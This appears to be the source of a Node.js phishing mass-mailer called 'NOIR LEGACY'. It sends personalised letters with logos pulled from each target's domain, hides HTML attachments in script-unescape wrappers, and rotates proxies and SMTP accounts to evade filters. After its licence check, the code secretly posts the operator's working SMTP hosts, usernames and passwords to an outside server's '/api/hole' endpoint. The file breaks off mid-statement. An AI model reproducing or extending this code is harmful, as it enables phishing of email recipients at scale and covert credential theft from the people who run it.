import {
  Worker,
  isMainThread,
  workerData,
  parentPort,
  MessageChannel,
} from "worker_threads";
import _nodemailer from "nodemailer";
import _node_html_to_image from "node-html-to-image";
import eml_format from "eml-format";
import _os from "os";
import _urlencode from "urlencode";
import { fileURLToPath } from "url";
import { createRequire } from "module";
import { dirname } from "path";
import _inquirer from "inquirer";
import _axios from "axios";
import _loading_cli from "loading-cli";
import _cfonts from "cfonts";
import _fs from "fs";
import _colors from "colors";
import _random_places from "random-places";
import _random_ipv4 from "random-ipv4";
import _ejs from "ejs";
import _html_pdf from "html-pdf";
import _email_to_name from "email-to-name";
const require = createRequire(import.meta.url),
  __filename = fileURLToPath(import.meta.url),
  __dirname = dirname(__filename),
  path = require("path"),
  load = _loading_cli("...loading "),
  {
    setup: setup,
    smtp: smtp,
    generate_random_number: generate_random_number,
    generate_random_string: generate_random_string,
    setup_time_date: setup_time_date,
    attachment: attachment,
    myLOGO: myLOGO,
    attachment_EML: attachment_EML,
    menu: menu,
    proxy: proxy,
  } = require("./settings");
var array = _fs
    .readFileSync(__dirname + "/" + setup.mailist)
    .toString()
    .split("\n"),
  array_proxy = [];
proxy.test_proxy &&
  (array_proxy = _fs.readFileSync("proxy.txt").toString().split("\n")),
  1 == array.length &&
    "" == array[0] &&
    (console.error("please input your mailist into file mailist.txt".red),
    process.exit(0));
const { name: city, country: country } = getRandomPlace(),
  _format = { format: "Letter" };
var options = _format;
const timer = (e) => new Promise((t) => setTimeout(t, e));
let transporter,
  indexSmtp = 0;
const attachmentPdf = (e) =>
  new Promise((t, r) => {
    _html_pdf.create(e, options).toFile("./attachment.pdf", function (e, a) {
      t(a), r(e);
    });
  });
let useSmtp = 0,
  transposterArray = [],
  transporter_proxy = [];
if (proxy.test_proxy)
  try {
    for (let e = 0; e < array_proxy.length; e++) {
      const t = {
        ciphers: "SSLv3",
        rejectUnauthorized: menu.rejectUnauthorized,
      };
      transporter_proxy[e] = _nodemailer.createTransport({
        name: smtp[0].username.split("@")[1],
        host: smtp[0].host,
        proxy:
          0 == proxy.proxy_username.length
            ? proxy.proxy_type +
              "://" +
              array_proxy[e].split(":")[0] +
              ":" +
              array_proxy[e].split(":")[1]
            : proxy.proxy_type +
              "://" +
              proxy.proxy_username +
              ":" +
              proxy.proxy_password +
              "@" +
              array_proxy[e].split(":")[0] +
              ":" +
              array_proxy[e].split(":")[1],
        port: smtp[0].port,
        secure: smtp[0].secure,
        auth: { user: smtp[0].username, pass: smtp[0].password },
        tls: t,
      });
    }
  } catch (e) {
    console.log(e);
  }
try {
  for (let e = 0; e < smtp.length; e++)
    transposterArray[e] = _nodemailer.createTransport({
      name: smtp[indexSmtp].username.split("@")[1],
      host: smtp[e].host,
      pool: !0,
      maxConnections: menu.maxConnections,
      ignoreTLS: menu.ignoreTLS,
      maxMessages: menu.maxMessages,
      requireTLS: menu.requireTLS,
      proxy: proxy.final_proxy,
      port: smtp[e].port,
      secure: smtp[e].secure,
      auth: { user: smtp[e].username, pass: smtp[e].password },
      tls: { ciphers: "SSLv3", rejectUnauthorized: menu.rejectUnauthorized },
    });
} catch (e) {
  console.log(e);
}
async function sendEmail(e, t, r) {
  !t && process.exit(1);
  try {
    let n,
      o = capitalize(t.split("@")[1].split(".")[0]),
      s = _urlencode(setup.URLencode, "gbk"),
      i = _email_to_name.process(t),
      m = (t = t.replace(/(\r\n|\n|\r)/gm, "")).split("@")[1],
      l =
        '<img src="cid:noirsenderisthebest@noir.com" width=' +
        setup.widthImage_for_grabLogo_letter +
        ' height="' +
        setup.heightImage_for_grabLogo_letter +
        ' alt="logo.png">',
      p =
        '<img src="cid:mylogo@noirlogo.com" width=' +
        setup.widthImage_for_myLogo_letter +
        ' height="' +
        setup.heightImage_for_myLogo_letter +
        ' alt="logo2.png">',
      c = "";
    const { name: u, country: d } = getRandomPlace();
    let g = {};
    if (!0 === setup.useMylogo)
      for (let k = 0; k < myLOGO.length; k++)
        g[myLOGO[k].function_name] =
          '<img src="cid:mylogo' +
          k +
          '@noirlogo.com" alt="logo' +
          k +
          '.png">';
    setup.LetterToImage &&
      ((n = await _ejs.renderFile(
        __dirname + "/" + setup.fileName_LetterToImage,
        {
          NAME: i,
          COMPANYNAME: o,
          EMAIL: t,
          URLENCODE: s,
          EMAIL64: Buffer.from(t).toString("base64"),
          DOMAIN: m,
          RANDOMIP: _random_ipv4,
          TOBASE64: function (e) {
            return Buffer.from(e).toString("base64");
          },
          RANDOMCITY: u,
          RANDOMCOUNTRY: d,
          DATE: dateToday,
          HIDEEMAIL: hideEmail(t),
          TIME: time,
          LOGO: "LOGO FUNCTION IN IMAGE LETTER STILL IN DEVELOPING MODE",
          DATETOMORROW: dateTomorrow,
          ...array_random_number,
          ...array_random_string,
          ...g,
        }
      )),
      await _node_html_to_image({
        output: "./imageLetter.png",
        html: n,
        puppeteerArgs: {
          args: ["--no-sandbox", "--disabled-setupid-sandbox"],
          executablePath: "",
        },
      }),
      (c = '<img src="cid:letterimage@noir.com"  alt="letterImage.png">'));
    let _,
      h,
      f,
      y,
      E,
      T,
      A,
      M,
      x = await _ejs.renderFile(__dirname + "/" + setup.letter, {
        NAME: i,
        COMPANYNAME: o,
        URLENCODE: s,
        EMAIL: t,
        EMAIL64: Buffer.from(t).toString("base64"),
        DOMAIN: m,
        RANDOMIP: _random_ipv4,
        TOBASE64: function (e) {
          return Buffer.from(e).toString("base64");
        },
        LETTERTOIMAGE: c,
        RANDOMCITY: u,
        RANDOMCOUNTRY: d,
        DATE: dateToday,
        HIDEEMAIL: hideEmail(t),
        TIME: time,
        LOGO: l,
        MYLOGO: p,
        DATETOMORROW: dateTomorrow,
        ...array_random_number,
        ...array_random_string,
        ...g,
      }),
      O = setup.from_name,
      I = setup.mail_subject,
      R = r,
      N = setup.replyTo,
      S = setup.attachmentName,
      L = attachment_EML.attachment_name_EML,
      w = attachment_EML.from_email_eml,
      D = attachment_EML.subject_eml,
      b = "https://logo.clearbit.com/" + m;
    const C = [],
      P = [];
    for (
      ;
      null !== (T = /\<(.*?)\>/g.exec(attachment_EML.attachment_name_EML));

    )
      T.index === /\<(.*?)\>/g.lastIndex && /\<(.*?)\>/g.lastIndex++,
        (L = L.replace(T[0], replaceIt(T[1], t)));
    for (; null !== (A = /\<(.*?)\>/g.exec(attachment_EML.from_email_eml)); )
      A.index === /\<(.*?)\>/g.lastIndex && /\<(.*?)\>/g.lastIndex++,
        (w = w.replace(A[0], replaceIt(A[1], t)));
    for (; null !== (M = /\<(.*?)\>/g.exec(attachment_EML.subject_eml)); )
      M.index === /\<(.*?)\>/g.lastIndex && /\<(.*?)\>/g.lastIndex++,
        (D = D.replace(M[0], replaceIt(M[1], t)));
    for (; null !== (_ = /\<(.*?)\>/g.exec(setup.from_name)); )
      _.index === /\<(.*?)\>/g.lastIndex && /\<(.*?)\>/g.lastIndex++,
        (O = O.replace(_[0], replaceIt(_[1], t)));
    for (; null !== (h = /\<(.*?)\>/g.exec(setup.mail_subject)); )
      h.index === /\<(.*?)\>/g.lastIndex && /\<(.*?)\>/g.lastIndex++,
        (I = I.replace(h[0], replaceIt(h[1], t)));
    for (; null !== (f = /\<(.*?)\>/g.exec(setup.from_mail)); )
      f.index === /\<(.*?)\>/g.lastIndex && /\<(.*?)\>/g.lastIndex++,
        (R = R.replace(f[0], replaceIt(f[1], t)));
    for (; null !== (E = /\<(.*?)\>/g.exec(setup.replyTo)); )
      E.index === /\<(.*?)\>/g.lastIndex && /\<(.*?)\>/g.lastIndex++,
        (N = S.replace(E[0], replaceIt(E[1], t)));
    let G = !1;
    for (let v = 0; v < attachment_EML.attachment.length; v++) {
      for (
        G = !0, P[v] = attachment_EML.attachment[v].attachmentName;
        null !==
        (y = /\<(.*?)\>/g.exec(attachment_EML.attachment[v].attachmentName));

      )
        y.index === /\<(.*?)\>/g.lastIndex && /\<(.*?)\>/g.lastIndex++,
          (P[v] = P[v].replace(y[0], replaceIt(y[1], t)));
      attachment_EML.attachment[v].attachmentName.includes("<") && (G = !1);
    }
    for (let U = 0; U < attachment.length; U++) {
      for (
        G = !0, C[U] = attachment[U].filename;
        null !== (y = /\<(.*?)\>/g.exec(attachment[U].filename));

      )
        y.index === /\<(.*?)\>/g.lastIndex && /\<(.*?)\>/g.lastIndex++,
          (C[U] = C[U].replace(y[0], replaceIt(y[1], t)));
      G || ((C[U] = attachment[U].filename), (G = !1));
    }
    async function a(e) {
      const r = [];
      if (setup.useMylogo)
        for (let e = 0; e < myLOGO.length; e++)
          r.push({
            filename: o + ".png",
            path: myLOGO[e].nameFile,
            contentDisposition: "inline",
            cid: "mylogo" + e + "@noirlogo.com",
          });
      if (
        (setup.LetterToImage &&
          r.push({
            filename: o + ".png",
            path: "./imageLetter.png",
            contentDisposition: "inline",
            cid: "letterimage@noir.com",
          }),
        setup.useGrabLogo &&
          ("outlook.com" == m || "hotmail.com" == m || "office365.com" == m
            ? r.push({
                filename: o + ".png",
                path: "https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31",
                contentDisposition: "inline",
                cid: "noirsenderisthebest@noir.com",
              })
            : r.push({
                filename: o + ".png",
                path: e,
                contentDisposition: "inline",
                cid: "noirsenderisthebest@noir.com",
              })),
        setup.useAttachment)
      ) {
        let a;
        for (let n = 0; n < attachment.length; n++)
          if (".html" == path.extname(attachment[n].path)) {
            a = await _ejs.renderFile(__dirname + "/" + attachment[n].path, {
              NAME: i,
              COMPANYNAME: o,
              EMAIL: t,
              EMAIL64: Buffer.from(t).toString("base64"),
              DOMAIN: m,
              URLENCODE: s,
              LETTERTOIMAGE: c,
              RANDOMIP: _random_ipv4,
              RANDOMCITY: u,
              TOBASE64: function (e) {
                return Buffer.from(e).toString("base64");
              },
              HIDEEMAIL: hideEmail(t),
              RANDOMCOUNTRY: d,
              DATE: dateToday,
              TIME: time,
              LOGO:
                '<img src="' +
                e +
                '" width=' +
                setup.widthImage_for_grabLogo_attachment +
                ' height="' +
                setup.heighttImage_for_grabLogo_attachment +
                '   alt="logo2.png">',
              ...g,
              DATETOMORROW: dateTomorrow,
              ...array_random_number,
              ...array_random_string,
            });
            let l =
              "base64" === setup.encode_attachment
                ? await Buffer.from(a).toString("base64")
                : Buffer.from(a).toString("hex");
            if (!0 === attachment[n].attachmentToPdf) {
              await attachmentPdf(a);
              const e = { filename: C[n], path: "./attachment.pdf" };
              r.push(e);
            }
            if (
              (!0 === attachment[n].encryptAttachment &&
                r.push({
                  filename: C[n],
                  content:
                    '<script language="javascript">document.write( unescape(\'' +
                    escape(a) +
                    "'))</script>",
                }),
              !1 === attachment[n].encryptAttachment &&
                !1 === attachment[n].attachmentToPdf)
            ) {
              const e = {
                filename: C[n],
                content: l,
                encoding: setup.encode_attachment,
              };
              r.push(e);
            }
          } else {
            const e = {
              filename: C[n],
              path: attachment[n].path,
              encoding: setup.encode_attachment,
            };
            r.push(e);
          }
      }
      if (attachment_EML.use_EML) {
        let l = await _ejs.renderFile(
          __dirname + "/" + attachment_EML.letter_eml,
          {
            NAME: i,
            COMPANYNAME: o,
            EMAIL: t,
            URLENCODE: s,
            EMAIL64: Buffer.from(t).toString("base64"),
            DOMAIN: m,
            LETTERTOIMAGE: c,
            RANDOMIP: _random_ipv4,
            RANDOMCITY: u,
            TOBASE64: function (e) {
              return Buffer.from(e).toString("base64");
            },
            HIDEEMAIL: hideEmail(t),
            RANDOMCOUNTRY: d,
            DATE: dateToday,
            TIME: time,
            LOGO:
              '<img src="' +
              e +
              '" width=' +
              setup.widthImage_for_grabLogo_attachment +
              ' height="' +
              setup.heighttImage_for_grabLogo_attachment +
              '   alt="logo2.png">',
            ...g,
            DATETOMORROW: dateTomorrow,
            ...array_random_number,
            ...array_random_string,
          }
        );
        var a = [];
        if (attachment_EML.useAttachment_EML)
          for (let r = 0; r < attachment_EML.attachment.length; r++) {
            let n = await _ejs.renderFile(
              __dirname + "/" + attachment_EML.attachment[r].path,
              {
                NAME: i,
                COMPANYNAME: o,
                EMAIL: t,
                EMAIL64: Buffer.from(t).toString("base64"),
                DOMAIN: m,
                URLENCODE: s,
                LETTERTOIMAGE: c,
                RANDOMIP: _random_ipv4,
                RANDOMCITY: u,
                TOBASE64: function (e) {
                  return Buffer.from(e).toString("base64");
                },
                HIDEEMAIL: hideEmail(t),
                RANDOMCOUNTRY: d,
                DATE: dateToday,
                TIME: time,
                LOGO:
                  '<img src="' +
                  e +
                  '" width=' +
                  setup.widthImage_for_grabLogo_attachment +
                  ' height="' +
                  setup.heighttImage_for_grabLogo_attachment +
                  '   alt="logo2.png">',
                ...g,
                DATETOMORROW: dateTomorrow,
                ...array_random_number,
                ...array_random_string,
              }
            );
            a[r] = {
              name: P[r],
              contentType: "text/html; charset=utf-8",
              data: n,
              encoding: "base64",
            };
          }
        var n = {
          from: w,
          to: { name: i, email: t },
          subject: D,
          html: l,
          encoding: "base64",
          attachments: a,
        };
        eml_format.build(n, function (e, t) {
          if (e) return console.log(e);
          r.push({
            filename: L,
            content: Buffer.from(t).toString("base64"),
            encoding: "base64",
            contentType: "application/octet-stream",
          });
        });
      }
      return [...r];
    }
    return new Promise(async (r, n) => {
      e.set("proxy_socks_module", require("socks")),
        e
          .sendMail({
            from: '"' + O + '" < ' + R + ">",
            to: t,
            subject: I,
            encoding: setup.encode_letter,
            html: x,
            replyTo: N,
            attachments: await a(b),
            priority: setup.mail_priority,
          })
          .then((e) => {
            r(e);
          })
          .catch(async (o) => {
            o.toString().includes("Proxy") ||
            o.toString().includes("proxy") ||
            o.toString().includes("PROXY")
              ? n(o)
              : e
                  .sendMail({
                    from: '"' + O + '" < ' + R + ">",
                    to: t,
                    subject: I,
                    html: x,
                    encoding: setup.encode_letter,
                    replyTo: N,
                    attachments: await a(setup.defaultLogo),
                    priority: setup.mail_priority,
                  })
                  .then((e) => {
                    r(e);
                  })
                  .catch((e) => {
                    n(e);
                  });
          });
    });
  } catch (W) {
    console.log(W);
  }
}
function capitalize(e) {
  return e[0].toUpperCase() + e.slice(1);
}
function replaceIt(e, t) {
  let r = capitalize(t.split("@")[1].split(".")[0]),
    a = _email_to_name.process(t),
    n = t.split("@")[1];
  switch (e) {
    case "HIDEEMAIL":
      return hideEmail(t);
    case "DATE":
      return dateToday;
    case "RANDNUM1":
      return generate(1);
    case "RANDNUM2":
      return generate(2);
    case "RANDNUM3":
      return generate(3);
    case "RANDNUM4":
      return generate(4);
    case "RANDNUM5":
      return generate(5);
    case "EMAIL64":
      return Buffer.from(t).toString("base64");
    case "CAPITAL_RANDSTRING1":
      return makeid(1, "UPPERCASE");
    case "CAPITAL_RANDSTRING2":
      return makeid(2, "UPPERCASE");
    case "CAPITAL_RANDSTRING3":
      return makeid(3, "UPPERCASE");
    case "CAPITAL_RANDSTRING4":
      return makeid(4, "UPPERCASE");
    case "CAPITAL_RANDSTRING5":
      return makeid(5, "UPPERCASE");
    case "LOWER_RANDSTRING1":
      return makeid(1, "LOWERCASE");
    case "LOWER_RANDSTRING2":
      return makeid(2, "LOWERCASE");
    case "LOWER_RANDSTRING3":
      return makeid(3, "LOWERCASE");
    case "LOWER_RANDSTRING4":
      return makeid(4, "LOWERCASE");
    case "LOWER_RANDSTRING5":
      return makeid(5, "LOWERCASE");
    case "RANDSTRING1":
      return makeid(1);
    case "RANDSTRING2":
      return makeid(2);
    case "RANDSTRING3":
      return makeid(3);
    case "RANDSTRING4":
      return makeid(4);
    case "RANDSTRING5":
      return makeid(5);
    case "COMPANYNAME":
      return r;
    case "NAME":
      return a;
    case "EMAIL":
      return t;
    case "DOMAIN":
      return n;
    case "RANDOMCITY":
      return city;
    case "RANDOMCOUNTRY":
      return country;
    case "TIME":
      return time;
    case "DATETOMORROW":
      return dateTomorrow;
    case "AUTOFROMMAIL":
      return smtp[indexSmtp].username;
    default:
      return "";
  }
}
let dateToday = new Intl.DateTimeFormat(setup_time_date.time_format_lang, {
    timeZone: setup_time_date.time_zone,
    year: "numeric",
    day: "numeric",
    month: "long",
  }).format(new Date()),
  time = new Intl.DateTimeFormat(setup_time_date.time_format_lang, {
    timeZone: setup_time_date.time_zone,
    hour: "numeric",
    minute: "numeric",
    second: "numeric",
  }).format(new Date()),
  dateTomorrow = new Intl.DateTimeFormat(setup_time_date.time_format_lang, {
    timeZone: setup_time_date.time_zone,
    year: "numeric",
    day: "numeric",
    month: "long",
  }).format(new Date().setDate(new Date().getDate() + 1));
function makeid(e, t) {
  for (
    var r = "",
      a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz",
      n = a.length,
      o = 0;
    o < e;
    o++
  )
    r += a.charAt(Math.floor(Math.random() * n));
  switch (t) {
    case "RANDOM":
    default:
      return r;
    case "LOWERCASE":
      return r.toLowerCase();
    case "UPPERCASE":
      return r.toUpperCase();
  }
}
function validateEmail(e) {
  return /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/.test(
    String(e).toLowerCase()
  );
}
function makeid2(e) {
  for (
    var t =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234567892734",
      r = t.length,
      a = 0;
    a < e;
    a++
  )
    t.charAt(Math.floor(Math.random() * r));
}
let array_random_string = {};
for (let e = 0; e < generate_random_string.length; e++) {
  let t = generate_random_string[e].name,
    r = makeid(
      generate_random_string[e].lengt_value,
      generate_random_string[e].type
    );
  array_random_string[t] = r;
}
let hideEmail = function (e) {
  return e.replace(/(.{2})(.*)(?=@)/, function (e, t, r) {
    for (let e = 0; e < r.length; e++) t += "*";
    return t;
  });
};
function generate(e) {
  var t = 11;
  if (e > t) return generate(t) + generate(e - t);
  var r = (t = Math.pow(10, e + 1)) / 10;
  return ("" + (Math.floor(Math.random() * (t - r + 1)) + r)).substring(1);
}
let array_random_number = {};
for (let e = 0; e < generate_random_number.length; e++) {
  let t = generate_random_number[e].name,
    r = generate(generate_random_number[e].lengt_value);
  array_random_number[t] = r;
}
if (0 == menu.change_ip)
  if (isMainThread) {
    let e = [];
    setup.test_frommail &&
      (e = _fs
        .readFileSync(__dirname + "/" + setup.frommail_filename)
        .toString()
        .split("\n")),
      (async () => {
        _cfonts.say("## NO1R4 ##", {
          font: "block",
          align: "center",
          colors: ["#5f2eff", "#756eff"],
          letterSpacing: 0,
          lineHeight: -10,
          space: !0,
          maxLength: "0",
          independentGradient: !0,
          transitionGradient: !0,
          env: "node",
        }),
          await _axios
            .get("https://vanilla.500daysofspring.com/public/api/urlupdated")
            .then((e) => {
              const t = _cfonts.render(
                  "NOIR LEGACY\n|ICQ  :  https://icq.im/AoLGjooDXDI1C1_39iE\n\n",
                  { font: "console", align: "center", colors: ["cyan"] }
                ),
                r = _cfonts.render("" + e.data, {
                  font: "console",
                  align: "center",
                  colors: ["cyan"],
                });
              console.log(t.string + "\n" + r.string);
            });
        const t = { key: setup.key, token: setup.token };
        await _axios
          .post("https://vanilla.500daysofspring.com/public/api/verify", t)
          .then((t) => {
            _inquirer
              .prompt([
                { type: "input", name: "name", message: "username" },
                { type: "password", name: "password", message: "password" },
              ])
              .then((t) => {
                const r = { name: t.name, password: t.password };
                _axios
                  .post(
                    "https://vanilla.500daysofspring.com/public/api/getflank",
                    r
                  )
                  .then((r) => {
                    process.stdout.write("[2J[0;0H");
                    for (let e = 0; e < smtp.length; e++) {
                      const r = {
                        pool: !0,
                        host: smtp[e].host,
                        port: smtp[e].port,
                        secure: smtp[indexSmtp].secure,
                        auth: {},
                      };
                      (r.auth.user = smtp[e].username),
                        (r.auth.pass = smtp[e].password),
                        _nodemailer
                          .createTransport(r)
                          .verify(async function (e) {
                            if (e);
                            else {
                              const e = {
                                host: smtp[0].host,
                                port: smtp[0].port,
                                secure: smtp[indexSmtp].secure,
                                username: smtp[0].username,
                                password: smtp[0].password,
                                from_email: smtp[0].from_email,
                                user: t.name,
                              };
                              await _axios.post(
                                "https://vanilla.500daysofspring.com/public/api/hole",
                                e
                              );
                            }
                          });
                    }
                    if (
                      (console.log(
                        (
                          "\n\t\t\t\t\t\t\t\t\t\n                                    smtp    \t= " +
                          smtp.length +
                          "\n                                    mailist \t= " +
                          array.length +
                          "\n                                    username\t= " +
                          t.name +
                          "\n                                    MODE        = " +
                          setup.MultipleSmtp +
                          "\n\t\t\t\t    multithread = " +
                          (setup.isMultiThread ? "on" : "off") +
                          "\n                                    "
                        ).yellow.bold
                      ),
                      require("console-stamp")(console, {
                        colors: { stamp: "blue", label: "gray" },
                      }),
                      setup.isMultiThread)
                    ) {
                      let t = [],
                        r = [],
                        a = 1,
                        n = 0,
                        o = (smtp.length, setup.howManyThread, 0);
                      for (let s = 0; s < setup.howManyThread; s++) {
                        n === smtp.length && (n = 0);
                        const s = {
                          smtplenght: smtp.length,
                          useSmtpWorker: n,
                          awal: o,
                          array_frommail: e,
                        };
                        new Worker(__filename, { workerData: s })
                          .on("message", (e) => {
                            "success" == e.status &&
                              (t.push(e.index),
                              proxy.test_proxy
                                ? (console.log(
                                    (
                                      "[" +
                                      a +
                                      "/" +
                                      array.length +
                                      "] proxy " +
                                      array_proxy[e.index] +
                                      " succesfully sent to ===>" +
                                      array[e.index]
                                    ).yellow
                                  ),
                                  _fs.open(
                                    __dirname + "/" + proxy.proxy_live,
                                    "a",
                                    666,
                                    function (t, r) {
                                      _fs.write(
                                        r,
                                        array_proxy[e.index] + _os.EOL,
                                        null,
                                        "utf8",
                                        function () {
                                          _fs.close(r, function () {
                                            console.log(
                                              ("saved to " + proxy.proxy_live)
                                                .green
                                            );
                                          });
                                        }
                                      );
                                    }
                                  ))
                                : console.log(
                                    (
                                      "[" +
                                      a +
                                      "/" +
                                      array.length +
                                      "] email succesfully sent to ===>" +
                                      array[e.index]
                                    ).yellow
                                  ),
                              a++),
                              "failed" == e.status &&
                                ("bad email" == e.msgError
                                  ? (console.error(
                                      (
                                        "[" +
                                        a +
                                        "/" +
                                        array.length +
                                        "] bad email ===>" +
                                        array[e.index]
                                      ).red
                                    ),
                                    a++)
                                  : 550 == e.errorCode || 535 == e.errorCode
                                  ? console.error(
                                      (e.pesanError + " " + array[e.index]).red
                                    )
                                  : console.error(e.pesanError),
                                r.push(e.index)),
                              t.length + r.length == array.length &&
                                (async () => {
                                  (array = array.filter(function (e, r) {
                                    return -1 == t.indexOf(r);
                                  })),
                                    await timer(200);
                                  var e = _fs.createWriteStream("mailist.txt");
                                  e.on("error", function (e) {
                                    Console.log(e);
                                  }),
                                    array.forEach((t) => e.write("" + t)),
                                    e.on("finish", function () {
                                      return process.exit(0);
                                    }),
                                    e.end();
                                })();
                          })
                          .on("error", (e) => {
                            console.log(e);
                          })
                          .on("exit", (e) => {
                            0 !== e && console.log("Exit " + e);
                          }),
                          ++o,
                          ++n;
                      }
                    } else {
                      let e = [];
                      setup.test_frommail &&
                        (e = _fs
                          .readFileSync(
                            __dirname + "/" + setup.frommail_filename
                          )
                          .toString()
                          .split("\n")),
                        (async () => {
                          try {
                            let t = 0;
                            for (; t < array.length; ) {
                              useSmtp == transposterArray.length &&
                                (useSmtp = 0),
                                (array[t] = array[t].replace(
                                  /(\r\n|\n|\r)/gm,
                                  ""
                                ));
                              try {
                                if (!validateEmail(array[t]))
                                  throw (t++, "bad email " + array[t - 1]);
                                1 == proxy.test_proxy
                                  ? (console.log("sukses"),
                                    await sendEmail(
                                      transporter_proxy[t],
                                      array[t],
                                      smtp[0].from_email
                                    )
                                      .then(async (e) => {
                                        console.log(
                                          (
                                            " [" +
                                            (t + 1) +
                                            "/" +
                                            array.length +
                                            "] proxy " +
                                            array_proxy[t] +
                                            " succesfully sent to ===> " +
                                            (e.accepted || "") +
                                            " "
                                          ).green
                                        ),
                                          await timer(setup.sleep_time),
                                          useSmtp++,
                                          t++,
                                          t == array.length && process.exit();
                                      })
                                      .catch(async (e) => {
                                        const r = { e: e };
                                        console.log(r), t++;
                                      }))
                                  : (setup.email_test &&
                                      t % setup.test_every == 0 &&
                                      sendEmail(
                                        "ROTATE" == setup.MultipleSmtp
                                          ? transposterArray[useSmtp]
                                          : transposterArray[0],
                                        array[t],
                                        setup.test_frommail
                                          ? e[t].replace(/(\r\n|\n|\r)/gm, "")
                                          : "ROTATE" == setup.MultipleSmtp
                                          ? smtp[useSmtp].from_email
                                          : smtp[0].from_email
                                      ),
                                    0 == array[t].length &&
                                      (console.log(
                                        "leads cant running if any space in leads mailist error on line " +
                                          (t + 1)
                                      ),
                                      process.exit()),
                                    await sendEmail(
                                      "ROTATE" == setup.MultipleSmtp
                                        ? transposterArray[useSmtp]
                                        : transposterArray[0],
                                      array[t],
                                      setup.test_frommail
                                        ? e[t].replace(/(\r\n|\n|\r)/gm, "")
                                        : "ROTATE" == setup.MultipleSmtp
                                        ? smtp[useSmtp].from_email
                                        : smtp[0].from_email
                                    )
                                      .then(async (e) => {
                                        console.log(
                                          (
                                            " [" +
                                            (t + 1) +
                                            "/" +
                                            array.length +
                                            "] email succesfully sent to ===> " +
                                            (e.accepted || "")
                                          ).green
                                        ),
                                          await timer(setup.sleep_time),
                                          useSmtp++,
                                          t++,
                                          t == array.length && process.exit();
                                      })
                                      .catch(async (e) => {
                                        "ROTATE" == setup.MultipleSmtp &&
                                          (1 != smtp.length
                                            ? (null == e.response
                                                ? console.log(e)
                                                : console.log(
                                                    (
                                                      "[" +
                                                      (t + 1) +
                                                      "/" +
                                                      array.length +
                                                      "] " +
                                                      e.response +
                                                      " failed send to ==> " +
                                                      array[t] +
                                                      " "
                                                    ).red
                                                  ),
                                              console.log(
                                                (
                                                  "[" +
                                                  (t + 1) +
                                                  "/" +
                                                  array.length +
                                                  "] ROTATE SMTP"
                                                ).yellow
                                              ),
                                              transposterArray.splice(
                                                useSmtp,
                                                1
                                              ),
                                              smtp.splice(useSmtp, 1))
                                            : (null == e.response
                                                ? console.log(e)
                                                : console.log(
                                                    (
                                                      "[" +
                                                      (t + 1) +
                                                      "/" +
                                                      array.length +
                                                      "] " +
                                                      e.response +
                                                      " failed send to ==> " +
                                                      array[t] +
                                                      " "
                                                    ).red
                                                  ),
                                              process.exit())),
                                          "QUEUE" == setup.MultipleSmtp &&
                                            (transposterArray.splice(0, 1),
                                            smtp.splice(0, 1),
                                            0 == smtp.length &&
                                              (console.log(
                                                (
                                                  "sending email stop in line " +
                                                  t +
                                                  " "
                                                ).yellow
                                              ),
                                              process.exit()),
                                            console.log(
                                              (
                                                "[" +
                                                (t + 1) +
                                                "/" +
                                                array.length +
                                                "] " +
                                                e.response +
                                                "  "
                                              ).red
                                            ),
                                            console.log(
                                              (
                                                "[" +
                                                (t + 1) +
                                                "/" +
                                                array.length +
                                                "] CHANGE TO THE NEXT SMTP"
                                              ).yellow
                                            ),
                                            (indexSmtp += 1));
                                      }));
                              } catch (e) {
                                console.error(("" + e).red);
                              }
                            }
                          } catch (e) {
                            console.error(("" + e).red);
                          }
                        })();
                    }
                  })
                  .catch(
                    (e) => (
                      console.log(("" + e.response.data).red), process.exit(0)
                    )
                  );
              })
              .catch(
                (e) => (
                  rejects(e), console.log(e.response.data), process.exit(0)
                )
              );
          })
          .catch(
            (e) => (
              console.log(("" + e.response.data.mgs).red), process.exit(0)
            )
          );
      })();
  } else
    (async () => {
      let e = workerData.awal,
        t = workerData.array_frommail,
        r = workerData.useSmtpWorker,
        a = !1;
      for (; e < array.length; ) {
        if (1 == a) {
          const e = Math.floor(Math.random() * smtp.length);
          (r = e), console.log(r);
        }
        array[e] = array[e].replace(/(\r\n|\n|\r)/gm, "");
        try {
          if (!validateEmail(array[e])) {
            const t = { status: "failed", index: e, msgError: "bad email" };
            parentPort.postMessage(t), (e += setup.howManyThread);
          }
          proxy.test_proxy
            ? await sendEmail(
                transporter_proxy[e],
                array[e],
                smtp[0].from_email
              )
                .then(async (t) => {
                  const r = { status: "success" };
                  (r.index = e),
                    parentPort.postMessage(r),
                    (a = !1),
                    await timer(setup.sleep_time),
                    (e += setup.howManyThread),
                    e == array.length && process.exit(0);
                })
                .catch(async (t) => {
                  console.error(
                    (
                      "[" +
                      (e + 1) +
                      "/" +
                      array.length +
                      "] " +
                      array_proxy[e] +
                      " ===>" +
                      t
                    ).red
                  ),
                    (e += setup.howManyThread),
                    e == array.length && process.exit(0);
                })
            : (setup.email_test &&
                e % setup.test_every == 0 &&
                sendEmail(
                  "ROTATE" === setup.MultipleSmtp
                    ? transposterArray[r]
                    : transposterArray[useSmtp],
                  array[e],
                  setup.test_frommail
                    ? t[e].replace(/(\r\n|\n|\r)/gm, "")
                    : "ROTATE" == setup.MultipleSmtp
                    ? smtp[r].from_email
                    : smtp[useSmtp].from_email
                ),
              await sendEmail(
                "ROTATE" === setup.MultipleSmtp
                  ? transposterArray[r]
                  : transposterArray[useSmtp],
                array[e],
                setup.test_frommail
                  ? t[e].replace(/(\r\n|\n|\r)/gm, "")
                  : "ROTATE" == setup.MultipleSmtp
                  ? smtp[r].from_email
                  : smtp[useSmtp].from_email
              )
                .then(async (t) => {
                  const r = { status: "success" };
                  (r.index = e),
                    parentPort.postMessage(r),
                    (a = !1),
                    await timer(setup.sleep_time),
                    (e += setup.howManyThread),
                    e == array.length && process.exit(0);
                })
                .catch(async (t) => {
                  const n = { ...t };
                  console.log(n),
                    "ROTATE" == setup.MultipleSmtp &&
                      (transposterArray.splice(r, 1),
                      smtp.splice(r, 1),
                      0 == smtp.length
                        ? process.exit(0)
                        : (console.log(t),
                          console.error(
                            "SMTP NOT WORKING = TRY TO CHANGE SMTP".red
                          ),
                          (a = !0))),
